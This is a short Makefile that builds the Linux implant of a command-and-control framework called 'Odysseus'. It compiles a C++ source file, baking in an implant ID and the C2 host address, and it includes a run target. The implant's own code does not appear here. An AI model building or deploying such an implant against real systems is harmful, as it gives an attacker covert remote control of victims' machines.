# Project:	Odysseus
# Title: 	Linux implant of Odysseus C2
# Author:	ramb0
CC 		= g++ 
SOURCE	= ./src
OUTPUT	= ./bin
MAIN	= main.cpp
PROJECT = implant

default:
	mkdir -p ./bin
	$(CC) -D SLAVE_ID=\"$(IMPLANT_ID)\" -D C2HOST=\"$(HOST)\" -o $(OUTPUT)/$(PROJECT) $(SOURCE)/$(MAIN);


run:
	$(OUTPUT)/$(PROJECT)
